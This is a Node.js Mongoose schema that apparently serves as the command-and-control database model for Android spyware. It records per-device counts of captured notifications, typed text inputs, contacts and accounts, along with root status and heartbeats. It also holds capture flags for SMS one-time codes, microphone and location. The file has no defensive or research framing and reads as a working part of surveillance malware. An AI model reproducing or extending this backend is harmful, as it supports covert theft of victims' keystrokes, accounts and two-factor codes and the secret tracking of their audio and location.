const mongoose = require('mongoose');

const deviceSchema = new mongoose.Schema({
    deviceId: {
        type: String,
        required: true,
        unique: true
    },
    deviceModel: {
        type: String,
        required: true
    },
    deviceBrand: {
        type: String,
        default: ''
    },
    androidVersion: {
        type: String,
        default: ''
    },
    apiLevel: {
        type: Number,
        default: 0
    },
    screenResolution: {
        type: String,
        default: ''
    },
    totalStorage: {
        type: String,
        default: ''
    },
    availableStorage: {
        type: String,
        default: ''
    },
    ramSize: {
        type: String,
        default: ''
    },
    cpuArchitecture: {
        type: String,
        default: ''
    },
    isRooted: {
        type: Boolean,
        default: false
    },
    lastSeen: {
        type: Date,
        default: Date.now
    },
    firstSeen: {
        type: Date,
        default: Date.now
    },
    totalNotifications: {
        type: Number,
        default: 0
    },
    totalTextInputs: {
        type: Number,
        default: 0
    },
    totalContacts: {
        type: Number,
        default: 0
    },
    totalAccounts: {
        type: Number,
        default: 0
    },
    captureStatus: {
        notifications: {
            type: Boolean,
            default: false
        },
        smsOtp: {
            type: Boolean,
            default: false
        },
        microphone: {
            type: Boolean,
            default: false
        },
        location: {
            type: Boolean,
            default: false
        }
    },
    lastHeartbeat: {
        type: Date
    }
}, {
    timestamps: true
});

// Create indexes for better performance
deviceSchema.index({ deviceModel: 1 });
deviceSchema.index({ lastSeen: -1 });
deviceSchema.index({ createdAt: -1 });

// Pre-save middleware to update lastSeen
deviceSchema.pre('save', function(next) {
    this.lastSeen = new Date();
    next();
});

module.exports = mongoose.model('Device', deviceSchema);
